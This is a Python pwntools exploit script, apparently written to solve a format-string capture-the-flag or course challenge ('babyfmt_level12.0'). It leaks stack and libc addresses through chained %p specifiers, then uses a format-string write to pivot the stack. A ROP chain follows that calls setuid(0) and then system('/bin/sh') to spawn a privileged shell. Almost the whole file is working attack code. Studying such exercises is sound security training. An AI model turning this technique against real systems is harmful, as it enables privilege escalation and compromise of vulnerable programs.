from pwn import *

binary = './babyfmt_level12.0_patched'
libc = ELF('./libc.so.6')

p = process(binary)
s = '''
b * printf
b * printf+198
b * func+426
'''


context.clear(arch='amd64')
# For the initial leaks, we'll need to use a different approach
# Since we can't use direct parameter access, we'll need to use a sequence of %p values

def leak_values_no_dollar(rbp_pos, libc_pos):
    # Create a payload that prints a sequence of pointers
    payload = b""
    for i in range(max(rbp_pos, libc_pos) + 1):
        payload += b"%p "
    
    return payload

# Start with leaking values
rbp_pos = int(0x470 / 8 + 6)
libc_pos = int(0x560 / 8 + 6)

# Use the new approach to leak values
payload = leak_values_no_dollar(rbp_pos, libc_pos)




p.sendline(payload)
p.recvuntil("Your input is: ")
p.recvline()

# Parse through the output to find our values
leak_data = p.recvline().strip().decode().split()

old_rbp = int(leak_data[rbp_pos - 1], 16)  # Adjust index as needed
libc_leak = int(leak_data[libc_pos - 1], 16)  # Adjust index as needed
libc_base = libc_leak - 0x229190









rsp = old_rbp - 0x4c8
new_rbp = old_rbp - 0x50
print("old rbp: ", hex(old_rbp))
print("rsp: ", hex(rsp))
print("new_rbp: ", hex(new_rbp))
print("libc base: ", hex(libc_base))



# Essential addresses
setuid = libc_base + libc.sym['setuid']
system = libc_base + libc.sym['system']
bin_sh_addr = libc_base + 0x1b45bd
print("setuid :", hex(setuid))
print("system :", hex(system))
print("bin_sh_addr :", hex(bin_sh_addr))

# Gadgets
pop_rdi = libc_base + 0x0000000000023b6a
leave_ret = libc_base + 0x00000000000578c8
ret = libc_base + 0x0000000000022679
print("pop_rdi :", hex(pop_rdi))
print("leave_ret :", hex(leave_ret))
print("ret :", hex(ret))





payload = b"----"
printed = len(payload) + 0x44
param_pos = int(0x98/ 8 + 6) # 0x168
ROP_start = old_rbp - 0x2a8 -8 - 8


writes = {
    rsp: leave_ret,     # Overwrite the saved rbp with leave_ret gadget address
    new_rbp: ROP_start      # Overwrite new_rbp with the address of your ROP chain
}

# Create format string payload
# Use position parameter and remove "$" characters
payload += fmtstr_payload(
    offset = param_pos,               # Adjust this based on your specific offset
    writes = writes,
    numbwritten = printed,
    write_size='byte',     # Use 'short' or 'byte' to minimize payload size
    strategy='small',
    no_dollars = True       # Specify $ as a character to avoid
)

	

# ROP chain
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system)

gdb.attach(p, s)


p.sendline(payload)
p.interactive()
